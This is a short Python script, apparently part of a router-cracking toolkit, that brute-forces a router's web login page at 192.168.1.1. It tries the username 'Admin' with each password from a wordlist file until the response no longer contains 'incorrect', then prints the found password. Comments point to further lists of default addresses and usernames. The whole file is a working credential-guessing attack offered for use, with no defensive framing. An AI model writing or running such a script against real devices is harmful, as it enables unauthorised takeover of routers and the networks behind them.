import requests
import sys

url = "http://192.168.1.1" # Check address.md for routers' default IP address.

expression = "incorrect"

def brute(username, password):
    data = { 'username': username, 'password': password }
    r = requests.post(url, data=data)
    if expression not in r.content:
        print("Brute Forcing...")
        print("[+] Password found : ",password)
        sys.exit()
    else:
        print(r.content," ",password)

def main():
    words = [w.strip() for w in open("password.txt", "rb").readlines()]
    for payload in words:
        brute("Admin", payload) # if 'Admin' does not work, try another default username in username.txt.

if __name__ == '__main__':
    main()
